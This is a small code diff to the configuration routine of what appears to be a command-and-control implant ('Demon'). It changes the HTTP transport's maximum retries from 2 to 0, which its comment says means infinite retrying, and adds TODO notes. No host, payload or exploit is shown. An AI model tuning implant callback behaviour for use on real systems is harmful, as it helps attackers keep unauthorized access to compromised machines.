@@ -862,9 +862,10 @@ VOID DemonConfig()
     )
 
 #ifdef TRANSPORT_HTTP
-    Instance.Config.Transport.Method         = L"POST";
+    Instance.Config.Transport.Method         = L"POST"; /* TODO: make it optional */
     Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
-    Instance.Config.Transport.HostMaxRetries = 2;  /* Max retries. */
+    Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
+                                                    * TODO: add this to the yaotl language and listener GUI */
     Instance.Config.Transport.Hosts          = NULL;
     Instance.Config.Transport.Host           = NULL;
 
